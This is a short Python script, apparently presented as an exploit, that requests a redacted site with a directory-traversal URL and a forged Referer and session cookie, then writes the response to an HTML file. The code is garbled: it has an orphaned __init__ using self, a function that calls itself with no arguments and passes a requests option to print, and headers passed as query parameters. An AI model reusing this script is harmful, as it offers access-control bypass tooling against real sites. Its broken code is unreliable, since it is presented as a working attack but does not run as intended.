# Coded By NAuliajati
# Use your own Risk
# Under BSD 3-Clause License
# Compiled with Python 3.5
import requests as reqq
from flask import redirect, url_for
from bs4 import BeautifulSoup

url = 'http://redacted.com/path/../upload/../index.php/..;/x' # directory traversal

heads1 = {
    'Referer': 'http://redacted.com/path/../upload/../index.php/..;/x',
    'Cookie': 'PHPSESSID=AAAAAA'
} # bypassing via http header

def __init__(self, url, heads1):
        self.url = url
        self.heads1 = heads1

def url_redir(url, heads1, methods = ['GET']):
    if url_redir() in url:
        print(url, allow_redirects=False)
        return url

ambil_data = reqq.get(url, heads1)

html_file = BeautifulSoup(ambil_data.text, "html.parser")

print(ambil_data.status_code, html_file.prettify(), file=open("output.html", "a"))
